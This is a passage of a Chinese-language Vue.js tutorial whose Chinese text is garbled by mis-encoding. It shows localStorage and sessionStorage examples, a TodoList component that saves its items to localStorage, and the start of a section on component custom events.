class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>localStorage<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>localStorage<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;saveData()&quot;</span>&gt;</span>ç‚¹æˆ‘ä¿å­˜ä¸€ä¸ªæ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;readData()&quot;</span>&gt;</span>ç‚¹æˆ‘è¯»å–ä¸€ä¸ªæ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;deleteData()&quot;</span>&gt;</span>ç‚¹æˆ‘åˆ é™¤ä¸€ä¸ªæ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;deleteAllData()&quot;</span>&gt;</span>ç‚¹æˆ‘æ¸…ç©ºä¸€ä¸ªæ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">let</span> p = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">saveData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;msg&#x27;</span>,<span class="hljs-string">&#x27;hello!!!&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>,<span class="hljs-number">666</span>)</span><br><span class="language-javascript">                <span class="hljs-comment">// è½¬æˆ JSON å¯¹è±¡å­˜è¿›å»</span></span><br><span class="language-javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;person&#x27;</span>,<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(p))</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">readData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;msg&#x27;</span>))</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>))</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> result = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;person&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(result))</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">// console.log(localStorage.getItem(&#x27;msg3&#x27;))</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deleteData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deleteAllData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">clear</span>()</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>sessionStorage</strong></p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>sessionStorage<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>sessionStorage<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;saveData()&quot;</span>&gt;</span>ç‚¹æˆ‘ä¿å­˜ä¸€ä¸ªæ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;readData()&quot;</span>&gt;</span>ç‚¹æˆ‘è¯»å–ä¸€ä¸ªæ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;deleteData()&quot;</span>&gt;</span>ç‚¹æˆ‘åˆ é™¤ä¸€ä¸ªæ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;deleteAllData()&quot;</span>&gt;</span>ç‚¹æˆ‘æ¸…ç©ºä¸€ä¸ªæ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">let</span> p = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">saveData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;msg&#x27;</span>,<span class="hljs-string">&#x27;hello!!!&#x27;</span>)</span><br><span class="language-javascript">sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>,<span class="hljs-number">666</span>)</span><br><span class="language-javascript">                <span class="hljs-comment">// è½¬æ¢æˆJSON å­—ç¬¦ä¸²å­˜è¿›å»</span></span><br><span class="language-javascript">sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;person&#x27;</span>,<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(p))</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">readData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;msg&#x27;</span>))</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>))</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> result = sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;person&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(result))</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">// console.log(sessionStorage.getItem(&#x27;msg3&#x27;))</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deleteData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">sessionStorage.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deleteAllData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">sessionStorage.<span class="hljs-title function_">clear</span>()</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>TodoListæ¡ˆä¾‹æœ¬åœ°å­˜å‚¨ App.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-container&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-wrap&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">myheader</span> <span class="hljs-attr">:p_receive</span>=<span class="hljs-string">&quot;addObj&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">myheader</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">MyListVue</span> <span class="hljs-attr">:p_todos</span>=<span class="hljs-string">&quot;todos&quot;</span> <span class="hljs-attr">:p_List_changeObjDone</span>=<span class="hljs-string">&quot;changeObjDone&quot;</span> <span class="hljs-attr">:p_List_Delete</span>=<span class="hljs-string">&quot;deleteTodoObj&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">MyListVue</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">MyFooterVue</span> <span class="hljs-attr">:p_todos</span>=<span class="hljs-string">&quot;todos&quot;</span> <span class="hljs-attr">:p_checkAll</span>=<span class="hljs-string">&quot;checkAll&quot;</span> <span class="hljs-attr">:p_clearAllTodo</span>=<span class="hljs-string">&quot;clearAllTodo&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">MyFooterVue</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">Myheader</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Myheader.vue&#x27;</span>;</span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyListVue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/MyList.vue&#x27;</span>;</span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyFooterVue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/MyFooter.vue&#x27;</span>;</span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> &#123;</span><br><span class="language-javascript">    nanoid</span><br><span class="language-javascript">  &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;nanoid&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title class_">Myheader</span>,</span><br><span class="language-javascript">      <span class="hljs-title class_">MyFooterVue</span>,</span><br><span class="language-javascript">      <span class="hljs-title class_">MyListVue</span>,</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">todos</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;todos&quot;</span>)) || []</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">// æ·»åŠ ä¸€ä¸ªtodo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">addObj</span>(<span class="hljs-params">title</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (!title) <span class="hljs-keyword">return</span> <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;ä¸å¯ä»¥ä¸ºç©º&#x27;</span>)</span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(title)</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">unshift</span>(&#123;</span><br><span class="language-javascript">          <span class="hljs-attr">id</span>: <span class="hljs-title function_">nanoid</span>(),</span><br><span class="language-javascript">          <span class="hljs-attr">title</span>: title,</span><br><span class="language-javascript">          <span class="hljs-attr">done</span>: <span class="hljs-literal">false</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// æ”¹å˜todoçŠ¶æ€</span></span><br><span class="language-javascript">      <span class="hljs-title function_">changeObjDone</span>(<span class="hljs-params">id</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">if</span> (todo.<span class="hljs-property">id</span> === id) todo.<span class="hljs-property">done</span> = !todo.<span class="hljs-property">done</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// åˆ é™¤todo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">deleteTodoObj</span>(<span class="hljs-params">id</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> todo.<span class="hljs-property">id</span> != id</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// å…¨é€‰ or å–æ¶ˆå…¨é€‰</span></span><br><span class="language-javascript">      <span class="hljs-title function_">checkAll</span>(<span class="hljs-params">value</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          todo.<span class="hljs-property">done</span> = value</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">//æ¸…é™¤æ‰€æœ‰å·²ç»å®Œæˆçš„todo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">clearAllTodo</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> !todo.<span class="hljs-property">done</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">watch</span>:&#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">todos</span>(<span class="hljs-params">value</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&quot;todos&quot;</span>,<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(value))</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-comment">/*base*/</span></span><br><span class="language-css">  <span class="hljs-selector-tag">body</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.btn</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">display</span>: inline-block;</span><br><span class="language-css">    <span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">12px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">text-align</span>: center;</span><br><span class="language-css">    <span class="hljs-attribute">vertical-align</span>: middle;</span><br><span class="language-css">    <span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="language-css">    <span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>), <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">2px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.05</span>);</span><br><span class="language-css">    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.btn-danger</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#da4f49</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#bd362f</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.btn-danger</span><span class="hljs-selector-pseudo">:hover</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#bd362f</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.btn</span><span class="hljs-selector-pseudo">:focus</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">outline</span>: none;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.todo-container</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">width</span>: <span class="hljs-number">600px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.todo-container</span> <span class="hljs-selector-class">.todo-wrap</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-4-ç»„ä»¶è‡ªå®šä¹‰äº‹ä»¶"><a href="#2-4-ç»„ä»¶è‡ªå®šä¹‰äº‹ä»¶" class="headerlink" title="2.4 ç»„ä»¶è‡ªå®šä¹‰äº‹ä»¶"></a>2.4 ç»„ä»¶è‡ªå®šä¹‰äº‹ä»¶</h2><ol><li><p>ä¸€ç§ç»„ä»¶é—´é€šä¿¡çš„æ–¹å¼ï¼Œé€‚ç”¨äºï¼š <strong>å­ç»„ä»¶ &#x3D;&#x3D;&#x3D;&gt; çˆ¶ç»„ä»¶</strong></p></li><li><p><strong>ä½¿ç”¨åœºæ™¯</strong> Aæ˜¯çˆ¶ç»„ä»¶ï¼ŒBæ˜¯å­ç»„ä»¶ï¼ŒBæƒ³ç»™Aä¼ æ•°æ®ï¼Œé‚£ä¹ˆå°±è¦åœ¨Aä¸­ç»™Bç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ï¼ˆäº‹ä»¶çš„å›è°ƒåœ¨Aä¸­ï¼‰ã€‚</p></li></ol><p><strong>3. ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ ï¼š</strong></p><ul><li><p>ç¬¬ä¸€ç§æ–¹å¼ï¼Œåœ¨çˆ¶ç»„ä»¶ä¸­ï¼š<code>&lt;Demo @atguigu=&quot;test&quot;/&gt;</code>æˆ– <code>&lt;Demo v-on:atguigu=&quot;test&quot;/</code></p></li><li><p>ç¬¬äºŒç§æ–¹å¼ï¼Œåœ¨çˆ¶ç»„ä»¶ä¸­<code>this.$refs.demo.$on(&#39;äº‹ä»¶å&#39;,æ–¹æ³•)</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;<span class="hljs-title class_">Demo</span> ref=<span class="hljs-string">&quot;demo&quot;</span>/&gt;<br>......<br><span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>)&#123;<br>   <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">demo</span>.$on(<span class="hljs-string">&#x27;atguigu&#x27;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">test</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>è‹¥æƒ³è®©è‡ªå®šä¹‰äº‹ä»¶åªèƒ½è§¦å‘ä¸€æ¬¡ï¼Œå¯ä»¥ä½¿ç”¨<strong>once</strong>ä¿®é¥°ç¬¦ï¼Œæˆ–<code>$once</code>æ–¹æ³•</p></li></ul><ol start="4"><li>è§¦å‘è‡ªå®šä¹‰äº‹ä»¶<code>this.$emit(&#39;äº‹ä»¶å&#39;,æ•°æ®)</code> </li><li>è§£ç»‘è‡ªå®šä¹‰äº‹ä»¶<code>this.$off(&#39;äº‹ä»¶å&#39;)</code> 